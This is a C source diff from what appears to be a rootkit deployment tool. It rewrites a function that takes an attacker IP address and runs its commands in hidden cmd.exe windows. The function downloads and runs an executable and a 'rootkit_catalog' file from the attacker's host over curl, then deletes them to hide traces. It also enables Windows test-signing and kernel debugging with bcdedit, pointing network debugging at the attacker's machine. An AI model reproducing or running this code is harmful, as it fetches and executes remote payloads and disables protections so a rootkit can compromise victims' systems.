@@ -2,30 +2,45 @@
 
 
 BOOL FilesAndDebugging(const char* AttackerIp, const char* DebugPort, const char* DebugKey) {
+	char ExecuteCommand[1024] = { 0 };
 	if (AttackerIp == NULL) {
 		printf("[-] Cannot get needed files on target machine - attacker's IP address is not specified!\n");
 		return FALSE;
 	}
-	if (system("taskkill /F /IM MainMedium.exe > nul") == -1) {
-		printf("[-] Failed execution of initial termination command of MainMedium.exe - %d\n", GetLastError());
-		return FALSE;
-	}
-	if (system("if exist C:\\nosusfolder rmdir /s /q C:\\nosusfolder > nul") == -1) {
-		printf("[-] Failed execution of initial deleting command of nosusfolder - %d\n", GetLastError());
-		return FALSE;
-	}
+	ShellExecuteA(0, "open", "cmd.exe",
+		"/C taskkill /F /IM MainMedium.exe > nul", 0, SW_HIDE);
+	ShellExecuteA(0, "open", "cmd.exe",
+		"/C rmdir /s /q C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097 > nul", 0, SW_HIDE);
+	ShellExecuteA(0, "open", "cmd.exe",
+		"/C mkdir C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5 > nul", 0, SW_HIDE);
+	
+	strcat_s(ExecuteCommand, "curl http://");
+	strcat_s(ExecuteCommand, AttackerIp);
+	strcat_s(ExecuteCommand, ":8080/WebScraper/x64/Release/WebScraper.exe --output WebScraper.exe");
+	system(ExecuteCommand);
+	RtlZeroMemory(ExecuteCommand, 1024);
+	
+	strcat_s(ExecuteCommand, "curl http://");
+	strcat_s(ExecuteCommand, AttackerIp);
+	strcat_s(ExecuteCommand, ":8080/rootkit_catalog.txt --output rootkit_catalog.txt");
+	system(ExecuteCommand);
+	RtlZeroMemory(ExecuteCommand, 1024);
 
-	const char* ReplaceArr[3] = { AttackerIp, DebugPort, DebugKey };
-	const char* SymbolsArr = "~`\'";
-	const int TotalCommands = 7;
-	const char* FileCommands[TotalCommands] = {
-		"if not exist C:\\nosusfolder\\verysus mkdir C:\\nosusfolder\\verysus && ",
-		"curl http://~:8080/WebScraper/x64/Release/WebScraper.exe --output C:\\nosusfolder\\verysus\\WebScraper.exe && ",
-		"curl http://~:8080/rootkit_catalog.txt --output C:\\nosusfolder\\verysus\\rootkit_catalog.txt && ",
-		"C:\\nosusfolder\\verysus\\WebScraper.exe C:\\nosusfolder\\verysus\\rootkit_catalog.txt ~ && ",
-		"bcdedit /set TESTSIGNING ON > nul && ",
-		"bcdedit /set DEBUG ON > nul && ",
-		"bcdedit /dbgsettings NET HOSTIP:~ PORT:` KEY:\' > nul" };
+	strcat_s(ExecuteCommand, "WebScraper.exe rootkit_catalog.txt ");
+	strcat_s(ExecuteCommand, AttackerIp);
+	system(ExecuteCommand);
+	RtlZeroMemory(ExecuteCommand, 1024);
 
-	return PerformCommand(FileCommands, ReplaceArr, SymbolsArr, TotalCommands, 3);
+	ShellExecuteA(0, "open", "cmd.exe", "/C del /s /q rootkit_catalog.txt > nul", 0, SW_HIDE);
+	ShellExecuteA(0, "open", "cmd.exe", "/C del /s /q WebScraper.exe > nul", 0, SW_HIDE);
+
+	ShellExecuteA(0, "open", "cmd.exe", "/C bcdedit /set TESTSIGNING ON > nul", 0, SW_HIDE);
+	ShellExecuteA(0, "open", "cmd.exe", "/C bcdedit /set DEBUG ON > nul", 0, SW_HIDE);
+	strcat_s(ExecuteCommand, "/C bcdedit /dbgsettings NET HOSTIP:");
+	strcat_s(ExecuteCommand, AttackerIp);
+	strcat_s(ExecuteCommand, " PORT:");
+	strcat_s(ExecuteCommand, DebugPort);
+	strcat_s(ExecuteCommand, " KEY:");
+	strcat_s(ExecuteCommand, DebugKey);
+	return TRUE;
 }
